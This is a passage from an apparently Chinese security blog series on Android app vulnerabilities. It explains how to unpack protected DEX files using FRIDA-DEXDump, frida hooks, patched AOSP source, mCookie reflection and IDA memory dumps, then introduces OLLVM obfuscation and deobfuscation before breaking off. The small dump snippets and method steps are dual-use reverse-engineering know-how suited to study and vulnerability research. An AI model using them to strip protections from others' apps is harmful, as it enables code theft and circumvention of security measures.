title=\"五、脱壳技术归纳\"></a>五、脱壳技术归纳</h2><p>前面分析了很多，最后无非整体加壳的脱壳方案落脚在DexFile的关键对象上，由此产生了一些常用的方法</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/54.png\" alt=\"image-20220613154906679\"></p>\n<h3 id=\"1-现有工具脱壳法\"><a href=\"#1-现有工具脱壳法\" class=\"headerlink\" title=\"1.现有工具脱壳法\"></a>1.现有工具脱壳法</h3><p>工欲善其事必先利其器，整体加壳已经很多年，不少的大佬们都开发了很多非常好用的工具，我们在自己掌握原理过程时，平时工作中也可以使用很多大佬的开发工具，这里随便举几个自己经常用的工具，这里我对各个大佬的脱壳工具进行了一个梳理</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/55.png\" alt=\"image-20220613154906679\"></p>\n<h4 id=\"（1）FRIDA-DEXDump\"><a href=\"#（1）FRIDA-DEXDump\" class=\"headerlink\" title=\"（1）FRIDA-DEXDump\"></a>（1）FRIDA-DEXDump</h4><p>这是葫芦娃大佬开发的针对整体加壳的工具，主要通过frida技术，文章参考：<a href=\"https://www.anquanke.com/post/id/221905\">深入 FRIDA-DEXDump 中的矛与盾</a>，该工具的特点是一般的hook方案通过直接搜索DEX的头文件dex.035来定位dex的起始地址，但是后来不少公司对头文件的魔术字段进行了抹除，这样针对没有文件头的 <code>DEX</code> 文件，该工具通过map_off 找到 DEX 的 map_list， 通过解析它，并得到类型为 TYPE_MAP_LIST 的条目计算出文件的大小和起始地址，也很好的提供了一种解决思路。</p>\n<p>使用方法：</p>\n<p>FRIDA-DEXDump使用十分的简单，详细参考github：<a href=\"https://github.com/hluwa/frida-dexdump\">FRIDA-DEXDump</a></p>\n<p>这里引用一张大佬星球的使用流程图，非常详细，快速进行脱壳</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/56.png\" alt=\"image-20220613161015961\"></p>\n<p>我们简单演示一下，这里结合objection一起使用</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/99.png\" alt=\"image-20220613224143108\"></p>\n<p>然后再次打开脱下来的dex，即可 </p>\n<h4 id=\"（2）FDex2\"><a href=\"#（2）FDex2\" class=\"headerlink\" title=\"（2）FDex2\"></a>（2）FDex2</h4><p>Fdex2主要是利用Android7.0及版本以下的特殊API <code>getDex()</code>来进行脱壳，原本是基于Xposed的模块，不过掌握原理后，大家可以使用各种Hook框架去实现,参考链接：<a href=\"https://bbs.pediy.com/thread-224105.htm\">安卓xposed脱壳工具FDex2 </a></p>\n<h4 id=\"（3）其他工具\"><a href=\"#（3）其他工具\" class=\"headerlink\" title=\"（3）其他工具\"></a>（3）其他工具</h4><p>针对整体壳的脱壳工具有很多，无非是针对各种脱壳点再采用不同的方法，其原理是殊途同归，而基于源码定制的Fart、youpk等等针对整体加壳壳都可以基本实现完全的脱壳，而且抽取壳也有着很好的效果，下面我们就依次来讲述具体的脱壳方法原理，各种脱壳工具如下图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/57.png\" alt=\"image-20220613162509955\"></p>\n<h3 id=\"2-Hook脱壳法\"><a href=\"#2-Hook脱壳法\" class=\"headerlink\" title=\"2.Hook脱壳法\"></a>2.Hook脱壳法</h3><p>我们前面知道了，只要函数中包含DexFile对象，我们就可以通过Hook技术拿到对象，然后取到begin和size，从而进行脱壳，市面上使用较多的无非是Xposed和frida，我平时使用frida较为方便，这里也用frida和大家演示：</p>\n<p>首先我们使用GDA识别加壳程序</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/58.png\" alt=\"image-20220613164418413\"></p>\n<p>很明显是进行了整体加壳，有没其他加壳暂时不知道，我们先进行脱壳</p>\n<p>找到脱壳点</p>\n<p>通过IDA打开<code>libart.so</code>，搜索DexFile，我们可以找到海量的脱壳点</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/59.png\" alt=\"image-20220613164747966\"></p>\n<p>我们就随便找一个包含DexFile的脱壳函数，然后记录符号值</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/60.png\" alt=\"image-20220613164841377\"></p>\n<p>然后我们编写hook脚本</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/62.png\" alt=\"image-20220613172003659\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">这里之所以获取begin加上一个指针，是因为我们前面讲了dexfile含有一个虚函数地址，所以加上一个指针偏移</span><br></pre></td></tr></table></figure>\n\n<p>然后启动frida_server</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/61.png\" alt=\"image-20220613170608657\"></p>\n<p>附加进程进行dump，这里我们存在sdcard下面，所以需要提前赋予sdcard权限</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/63.png\" alt=\"image-20220613172109177\"></p>\n<p>这里就脱壳成功</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/64.png\" alt=\"image-20220613172222202\"></p>\n<p>然后我们打开相应的dex</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/65.png\" alt=\"image-20220613172222202\"></p>\n<p>此时说明我们整体脱壳成功，不过应用还有抽取壳，这个不是本文解决的内容</p>\n<h3 id=\"3-插桩脱壳法\"><a href=\"#3-插桩脱壳法\" class=\"headerlink\" title=\"3.插桩脱壳法\"></a>3.插桩脱壳法</h3><p>插桩脱壳法，就是在Android源码里面定位到相应的脱壳点，然后插入相应的代码，重新编译源码生成系统镜像，最后就可以使用定制的系统进行脱壳</p>\n<p>我们在<a href=\"https://bbs.pediy.com/thread-269575.htm\">源码编译（1）——Android6.0源码编译详解</a>中已经讲述了如何编译源码，接下来我们进行插桩脱壳</p>\n<p>同理、还是定位脱壳点，我们还是随便定位一个脱壳点LoadMethod 然后进行插桩</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/98.png\" alt=\"image-20220613220518548\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//add</span></span><br><span class=\"line\"><span class=\"type\">char</span> dexfilepath[<span class=\"number\">100</span>]=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">memset</span>(dexfilepath,<span class=\"number\">0</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"built_in\">sprintf</span>(dexfilepath,<span class=\"string\">&quot;%d_%zu_LoadMethod.dex&quot;</span>,<span class=\"built_in\">getpid</span>(),dex_file.<span class=\"built_in\">Size</span>());</span><br><span class=\"line\"><span class=\"type\">int</span> dexfd = <span class=\"built_in\">open</span>(dexfilepathm,O_CREAT|O_RDWR,<span class=\"number\">666</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(dexfd&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> result = <span class=\"built_in\">write</span>(dexfd,dex_file.<span class=\"built_in\">Begin</span>(),dex_file.<span class=\"built_in\">Size</span>());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(result&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">close</span>(dexfd);</span><br><span class=\"line\">\t\t<span class=\"built_in\">LOG</span>(WARNING)&lt;&lt;<span class=\"string\">&quot;LoadMethod&quot;</span>&lt;&lt;dexfilepath;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//add</span></span><br></pre></td></tr></table></figure>\n\n<p>同理我们在<code>execute</code>同样插桩此段代码，最后进行编译，编译成功</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/66.png\" alt=\"image-20220613172222202\"></p>\n<p>然后给程序授权sdcard权限，再次启动应用，就可以看见脱取的dex文件就保存在sdcard目录下</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/97.png\" alt=\"image-20220613215956911\"></p>\n<p>再次将sdcard下dex文件打开，这里我们已经看见了8732435这个文件，再次打开脱取成功</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/65.png\" alt=\"image-20220613172222202\"></p>\n<h3 id=\"4-反射脱壳法\"><a href=\"#4-反射脱壳法\" class=\"headerlink\" title=\"4.反射脱壳法\"></a>4.反射脱壳法</h3><p>反射脱壳法的核心思想就是利用前面我们提到的mCooike值</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">核心思路：反射 + mCookie</span><br><span class=\"line\">步骤：</span><br><span class=\"line\"><span class=\"number\">1</span>、找到加固apk的任一class，一般选择主Application或Activity</span><br><span class=\"line\"><span class=\"number\">2</span>、通过该类找到对应的Classloader</span><br><span class=\"line\"><span class=\"number\">3</span>、通过该Classloader找到BaseDexClassLoader</span><br><span class=\"line\"><span class=\"number\">4</span>、通过BaseDexClassLoader找到其字段DexPathList</span><br><span class=\"line\"><span class=\"number\">5</span>、通过DexPathList找到其变量Element数组dexElements</span><br><span class=\"line\"><span class=\"number\">6</span>、迭代该数组，该数组内部包含DexFile结构</span><br><span class=\"line\"><span class=\"number\">7</span>、通过DexFile获取其变量mCookie和mFileName</span><br><span class=\"line\"> </span><br><span class=\"line\">至此我们已经获取了mCookie</span><br><span class=\"line\"> </span><br><span class=\"line\">对该mCookie的解释:</span><br><span class=\"line\">#<span class=\"number\">1</span>、<span class=\"number\">4.4</span>以下好像，mCookie对应的是一个<span class=\"type\">int</span>值，该值是指向<span class=\"keyword\">native</span>层内存中的dexfile的指针</span><br><span class=\"line\">#<span class=\"number\">2</span>、<span class=\"number\">5.0</span>是一个<span class=\"type\">long</span>值，该值指向<span class=\"keyword\">native</span>层std::vector&lt;const DexFile*&gt;* 指针，注意这里有多个dex，你需要找到你要的</span><br><span class=\"line\">#<span class=\"number\">3</span>、<span class=\"number\">8.0</span>，该值也是一个<span class=\"type\">long</span>型的值，指向底层vector，但是vector下标<span class=\"number\">0</span>是oat文件，从<span class=\"number\">1</span>开始是dex文件</span><br><span class=\"line\"><span class=\"comment\">// 至于你手机是那个版本，如果没有落入我上面描述的，你需要自己看看代码</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"number\">8</span>、根据mCookie对应的值做转换，最终你能找到dexfile内存指针</span><br><span class=\"line\"><span class=\"number\">9</span>、把该指针转换为dexfile结构，通过findClassDef来匹配你所寻找的dex是你要的dex</span><br><span class=\"line\"><span class=\"number\">10</span>、dump写文件</span><br></pre></td></tr></table></figure>\n\n<p>综述mCookie是在native层就是dexfile的指针，我们利用反射原理来获取mCookie，从而就可以进行脱壳了，这里我们同样使用frida演示：</p>\n<p>编写hook代码</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/67.png\" alt=\"image-20220613190231102\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/68.png\" alt=\"image-20220613190303491\"></p>\n<p>我们看见了和上面同样大小的8841876_mCookie.dex</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/69.png\" alt=\"image-20220613190401266\"></p>\n<p>使用工具打开，发现同样脱壳成功</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/70.png\" alt=\"image-20220613190438224\"></p>\n<h3 id=\"5-动态调试脱壳法\"><a href=\"#5-动态调试脱壳法\" class=\"headerlink\" title=\"5.动态调试脱壳法\"></a>5.动态调试脱壳法</h3><p>所谓动态调试法，核心原理和上面一样，就是我们在动态调试的过程中找到DexFile的起始地址和大小，然后执行脚本进行dump</p>\n<p>首先选取脱壳点，我们还是选择<code>DexFile::DexFile</code></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/90.png\" alt=\"image-20220613210130186\"></p>\n<p>动态调试的步骤我在前面的文章中已经做了详细的讲解，不会的朋友去看前面的文章</p>\n<p>首先我们启动android_server</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/81.png\" alt=\"image-20220613194111711\"></p>\n<p>然后我们附加上进程</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/82.png\" alt=\"image-20220613194326114\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/83.png\" alt=\"image-20220613195349008\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/86.png\" alt=\"image-20220613203024990\"></p>\n<p>然后我们打开libart.so，并定位到DexFile::DexFile</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/91.png\" alt=\"image-20220613210859021\"></p>\n<p>然后在该函数下断点，然后F9过来</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/92.png\" alt=\"image-20220613211145356\"></p>\n<p>此处我们就可以很明显看到X1就是我们的起始地址，X4是我们的偏移值</p>\n<p>编写脚本进行hook</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span>&#123;    </span><br><span class=\"line\"> <span class=\"keyword\">auto</span> fp, begin, end, dexbyte;      </span><br><span class=\"line\"> fp = <span class=\"built_in\">fopen</span>(<span class=\"string\">&quot;d:\\\\dump.dex&quot;</span>, <span class=\"string\">&quot;wb+&quot;</span>);      </span><br><span class=\"line\"> begin =  <span class=\"number\">0x76FCD93020</span>;    </span><br><span class=\"line\"> end = begin + <span class=\"number\">0x7EEC5600</span>; </span><br><span class=\"line\"> <span class=\"keyword\">for</span> ( dexbyte = begin; dexbyte&lt;end;dexbyte++)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">fputc</span>(<span class=\"built_in\">Byte</span>(dexbyte), fp);        </span><br><span class=\"line\"> &#125;   </span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/93.png\" alt=\"image-20220613214647627\"></p>\n<p>直接运行run</p>\n<p>然后我们查看dump.dex文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/94.png\" alt=\"image-20220613223330340\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/95.png\" alt=\"image-20220613215148251\"></p>\n<p>我们可以发现这里是代理类，还没有到我们想要的dex，我们再次F9，再次到这里，地址再次改变，再次结合长度来计算，我们每次计算可以取小点值，先试一下</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/96.png\" alt=\"image-20220613215343895\"></p>\n<p>发现还是不是，我们需要不停测试直到dump出dex为此</p>\n<p>这里大家可以下去按照此方法尝试，或者换一个脱壳点来尝试</p>\n<h3 id=\"6-特殊API脱壳法\"><a href=\"#6-特殊API脱壳法\" class=\"headerlink\" title=\"6.特殊API脱壳法\"></a>6.特殊API脱壳法</h3><p>所谓特殊的API脱壳法就是通过Android自身提供的API来获得Dex，这主要是参考Fdex2，前面我们讲了Fdex2主要是利用Android7.0及以下提供了getDex()和getBytes()两个API，我们可以直接可以获得class对象，然后直接调用这两个API</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/71.png\" alt=\"image-20220613191047342\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/72.png\" alt=\"image-20220613191158377\"></p>\n<p>编写hook代码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/74.png\" alt=\"image-20220613192251923\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.使用frida枚举所有Classloader </span><br><span class=\"line\">2.确定正确的ClassLoader并获取目标类的Class对象</span><br><span class=\"line\">3.通过Class对象获取得到dex对象</span><br><span class=\"line\">4.通过dex对象获取内存字节流并保存</span><br></pre></td></tr></table></figure>\n\n<p>然后我们查看程序的类对象，随便dump一个类对象</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/73.png\" alt=\"image-20220613191722932\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/75.png\" alt=\"image-20220613192447143\"></p>\n<p>然后我们再次用工具打开</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/76.png\" alt=\"image-20220613192548342\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/77.png\" alt=\"image-20220613192659791\"></p>\n<p>发现就可以成功的dump</p>\n<p>通过这种方式，我们发现神奇的事我们还可以抽取壳的情况，比如我们之前为空类</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/78.png\" alt=\"image-20220613192926853\"></p>\n<p>我们明显可以发现这里是采用了函数抽取的技术，一般的一代壳dump方案是无法解决抽取壳的，我们使用特殊API方法</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/79.png\" alt=\"image-20220613193028308\"></p>\n<p>再次打开，成功dump</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0007/80.png\" alt=\"image-20220613193102209\"></p>\n<p>这其实主要是抽取壳的一个回填时机的问题，这个详细放在以后抽取壳中讲解</p>\n<h2 id=\"六、实验总结\"><a href=\"#六、实验总结\" class=\"headerlink\" title=\"六、实验总结\"></a>六、实验总结</h2><p>本文总结了当下dex整体加壳的基本原理，和常用的一些脱壳方案，并一一进行复现，还有一些文件监控法等，由于我平时用的很少就没列举了，复现实验过程中由于涉及到不同的实验，所以我用了Android 6.0 Android 7.0 Android 8.0三台机器进行实验，所以大家可以注意下对应的方法和其Android版本，这里彻底解决了整体加壳的脱壳方案，到这里可以掌握脱壳、抓包、Hook、反Hook、反调、反签等基本手段，这样在进行Android App漏洞挖掘过程中将事半功倍。后面我将继续讲解Android App漏洞中的XSS漏洞、Sql注入漏洞、文件上传漏洞、端口扫描漏洞、WebView漏洞等。</p>\n<p>脱壳脚本相关样本会放在github，所有的脱壳脚本和工具和上传知识星球</p>\n<p>github：<a href=\"https://github.com/WindXaa\">github</a></p>\n<h2 id=\"七、参考文献\"><a href=\"#七、参考文献\" class=\"headerlink\" title=\"七、参考文献\"></a>七、参考文献</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://bbs.pediy.com/thread-252630.htm#msg_header_h2_4</span><br><span class=\"line\">https://bbs.pediy.com/thread-254555.htm#msg_header_h2_4</span><br><span class=\"line\">https://www.anquanke.com/post/id/221905?display=mobile</span><br><span class=\"line\">https://www.qj301.com/news/317.html</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（8）——（反混淆）Ollvm混淆与反混淆","url":"/2023/02/09/bug0008/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>本文为Android漏洞之战技巧篇的最后一个篇幅，前面我们依次讲了Hook、脱壳、反调、过签等，本文主要初步讲解Ollvm混淆与反混淆，本文收集整理了网络上开源的实验样本和脚本，实验脚本上传至github，实验样本上传至知识星球：安全后厨。</p>\n<span id=\"more\"></span>\n<p>本文收集整理了网上已有大佬们使用的一些开源脚本和样例，帮助初学者初步了解和学习Ollvm混淆和反混淆，脚本的原理和具体讲解参考文章链接或知识星球中的内容，本文考虑篇幅不做过多讲解。本文的结构主要分为：</p>\n<p>第一节介绍Ollvm混淆</p>\n<p>第二节介绍Ollvm反混淆的常见方法</p>\n<p>第三节进行Ollvm反混淆实操</p>\n<h2 id=\"1-Ollvm\"><a href=\"#1-Ollvm\" class=\"headerlink\" title=\"1.Ollvm\"></a>1.Ollvm</h2><h3 id=\"1-1-ollvm简介\"><a href=\"#1-1-ollvm简介\" class=\"headerlink\" title=\"1.1 ollvm简介\"></a>1.1 ollvm简介</h3><p>LLVM(Obfuscator-LLVM)是瑞士西北应用科技大学安全实验室于2010年6月份发起的一个项目,该项目旨在提供一套开源的针对LLVM的代码混淆工具,以增加对逆向工程的难度。github上地址是<a href=\"https://github.com/obfuscator-llvm/obfuscator\">https://github.com/obfuscator-llvm/obfuscator</a> ，只不过仅更新到llvm的4.0，2017年开始就没在更新。</p>\n<p>想了解OLLVM，首先需要明白LLVM是什么。简而言之，LLVM是模块化和可重用的编译器和工具链技术的集合。具体的过程如下图所示：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/1.png\"></p>\n<p>即需要完成如下的步骤：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">源代码（c/c++）经过clang--&gt; 中间代码(经过一系列的优化，优化用的是Pass) --&gt; 机器码</span><br></pre></td></tr></table></figure>\n\n<p>llvm正是因为将不同的语言转换为中间语言IR，然后通过编写一系列的Pass进行优化，最后在针对不同平台进行转换，所以可以支持不同平台</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/2.png\"></p>\n<p>我们前面提到了Pass，而llvm通过编写Pass将中间语言IR进行优化，而Ollvm则是通过编写更加复杂的Pass，将代码复杂化，这样就达到了混淆的目的。</p>\n<h3 id=\"1-2-ollvm分类\"><a href=\"#1-2-ollvm分类\" class=\"headerlink\" title=\"1.2 ollvm分类\"></a>1.2 ollvm分类</h3><p>前面我们已经知晓了ollvm的原理，那么这里我们理解最原始的ollvm的分类就变得更加容易。官方的Ollvm更新到llvm的4.0，目前主要分为：指令替换、虚假控制流、控制流平坦化。当然后面越来越多的人编写了更加复杂的Pass，这里我们就不具体深究了。</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/3.png\" alt=\"image-20220921201852889\"></p>\n<p>下面我们简单的介绍每个Pass的实现原理</p>\n<h4 id=\"1-2-1-指令替换（Sub）\"><a href=\"#1-2-1-指令替换（Sub）\" class=\"headerlink\" title=\"1.2.1 指令替换（Sub）\"></a>1.2.1 指令替换（Sub）</h4><p>指令替换，将一条运算指令，替换为多条等价的运算指令。例如：<code>y=x+1</code>变为<code>y=x+1-1</code></p>\n<h4 id=\"1-2-2-虚假控制流（bcf）\"><a href=\"#1-2-2-虚假控制流（bcf）\" class=\"headerlink\" title=\"1.2.2 虚假控制流（bcf）\"></a>1.2.2 虚假控制流（bcf）</h4><p>虚假控制流混淆主要通过加入包含不透明谓词的条件跳转和不可达的基本块，来干扰IDA的控制流分析和F5反汇编</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/4.png\" alt=\"image-20220921202830658\"></p>\n<p>不透明谓词：在跳转前就已经确定的不等式，但是IDA无法分析，例如<code> y &gt; 10 || x * (x + 1) % 2 == 0</code>这个不等式，大家都知道<code>x * (x + 1) % 2 == 0</code>这个式子是恒成立的，因此刚才这个不等式是恒成立的，当然这是我们知道，而IDA就不知道了，IDA不确定x，y的值，因此无法识别出来，因此就可以增加虚假控制流。</p>\n<p>不透明谓词是研究反虚假控制流的重点，因此不透明谓词除了永真&#x2F;永假型、还有可真可假型，而现在的研究都在此基础上进行了深入研究，所以不透明谓词的研究也成为难点。</p>\n<p>不可达基本块，是指在虚假控制流中一些基本块是永远不可能执行的，这也是进一步去增加代码的复杂程度</p>\n<h4 id=\"1-2-3-控制流平坦化（Fla）\"><a href=\"#1-2-3-控制流平坦化（Fla）\" class=\"headerlink\" title=\"1.2.3 控制流平坦化（Fla）\"></a>1.2.3 控制流平坦化（Fla）</h4><p>控制流平坦化，主要通过一个主分发器来控制程序基本块的执行流程。该方法将所有基本代码放到控制流最底部，然后删除原理基本块之间跳转关系，添加次分发器来控制分发逻辑，然后过新的复杂分发逻辑还原原来程序块之间的逻辑关系。</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0008/5.png\" alt=\"image-20220921210110215\"></p>\n<p>我们在阅读源码后，会发现逻辑十分清晰，Ollvm的基本流程：</p>\n<ul>\n<li>​\t添加一个随机数种子 blockID</li>\n<li>​    保存所有的基本块</li>\n<li>​    将代码中含有switch改为if</li>\n<li>​    删除第一个基本块，第一个需要特殊处理</li>\n<li>​    识别main中的if,并且删除跳转指令</li>\n<li>​    插入一个switch指令</li>\n<li>​    第一个块跳转到loopEntry块</li>\n<li>​    把所有的block保存到switch语句</li>\n<li>重新计算switch变量的值</li>\n<li>​    处理不是条件跳转 直接删除jump 跳转到loopEnd 进行下一轮循环</li>\n<li>​    处理条件跳转 对真分支和假分支进行相应处理 真则选择真的ID</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">先将里面含switch的改为if-else，再将所有的if-else变为Switch的结果，所以多次进行控制流平坦化就会变得越来越复杂</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"1-2-4-字符串加密\"><a href=\"#1-2-4-字符串加密\" class=\"headerlink\" title=\"1.2.4 字符串加密\"></a>1.2.4 字符串加密</h4><p>字符串加密的原理很简单，编写一个pass将其中的字符串信息使用一些加密算法进行加密，然后特定的时间进行还原。一般含有字符串混淆、函数名混淆、不在init_array解密等</p>\n<h2 id=\"2-Ollvm反混淆\"><a href=\"#2-Ollvm反混淆\" class=\"headerlink\" title=\"2.Ollvm反混淆\"></a>2.Ollvm反混淆</h2><p>ollvm反混淆主要思路基本上就是静态分析和动态分析，基本的流程大体都是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）找到所有基本块（特征匹配或机器学习） 控制流平坦化中区分虚假块和真实块是难点</span><br><span class=\"line\">（2）动静态分析找到真实块的联系</span><br><span class=\"line\">\t静态分析：符号执行/反编译器提供的IL的API</span><br><span class=\"line\">\t动态分析：模拟指令/IDA trace             </span><br><span class=\"line\">（3）编写相应的patch脚本，进行还原原程序</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-指令替换\"><a href=\"#2-1-指令替换\" class=\"headerlink\" title=\"2.1 指令替换\"></a>2.1 指令替换</h3><p>指令替换一般可以使用llvm的pass进行优化，或者使用Miasm框架进行匹配，然后优化处理即可，由于指令替换一般不会影响程序整体逻辑，这里我们不进行深究。</p>\n<h3 id=\"2-2-反字符串加密\"><a href=\"#2-2-反字符串加密\" class=\"headerlink\" title=\"2.2 反字符串加密\"></a>2.2 反字符串加密</h3><p>字符串加密的的常规解决方式：</p>\n<p><strong>（1）特征搜索</strong></p>\n<p>一般在so中可以直接搜索<code>datadiv_decode</code>，一般很多编写解密函数进行操作是这个函数，针对这种情况，一般可以通过frida hook就可以拿到解密后的值，然后进行patch</p>\n<p><strong>（2）init_array中解密</strong></p>\n<p>字符串解密操作在init_arrray中进行，一般可以通过模拟执行init_array，然后将解密后的字符串全部保存下来</p>\n<p><strong>（3）jni_onload解密</strong></p>\n<p>在jni_onload函数中进行解密操作，这时候就要进行inlinehook拿到解密后寄存器的值，也可以进行hook，也可以使用unicorn进行操作</p>\n<h3 id=\"2-3-反虚假控制流\"><a href=\"#2-3-反虚假控制流\" class=\"headerlink\" title=\"2.3 反虚假控制流\"></a>2.3 反虚假控制流</h3><p>虚假控制流去除的思路一般为除去不可达块和不透明谓词。但是难点在于不透明谓词，现在不透明谓词的研究不断发展，有永真&#x2F;永假型不透明谓词，也有可真可假型不透明谓词。当然针对复杂的虚假控制流，在反混淆过程中还需要考虑死循环等问题</p>\n<p><strong>不透明谓词：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">永真/假型：插入的后续基本块中必有一个不被执行</span><br><span class=\"line\">可真可假型：插入的两个后继基本块的语义应相同</span><br></pre></td></tr></table></figure>\n\n<p>针对简单的控制流混淆，去不透明谓词的思想主要是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）不直接处理不透明谓词，通过让不透明谓词的变量地址可读，则IDA便可以优化</span><br><span class=\"line\">（2）直接将不透明谓词赋值为0或者将不透明谓词中变量x，y赋值为0</span><br><span class=\"line\">（3）编译器优化去干掉不透明谓词</span><br></pre></td></tr></table></figure>\n\n<p><strong>不可达块：</strong></p>\n<p>不可达块是指控制流永远无法到达的基本块，一般我们可以使用符号执行或模拟执行来除去不可达基本块</p>\n<h3 id=\"2-4-反控制流平坦化\"><a href=\"#2-4-反控制流平坦化\" class=\"headerlink\" title=\"2.4 反控制流平坦化\"></a>2.4 反控制流平坦化</h3><p>一般通用的反控制流平坦化思路：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）先保存所有的基本块</span><br><span class=\"line\">（2）区分真实块和分发器（虚假块） 一般通过规则匹配来做，但是并无法使用所有情况 （难点）</span><br><span class=\"line\">（3）连接真实块的顺序  一般静态可以通过IDA trace然后编写IDApython脚本，动态可以通过符号执行、模拟执行</span><br><span class=\"line\">（4）编写patch修复  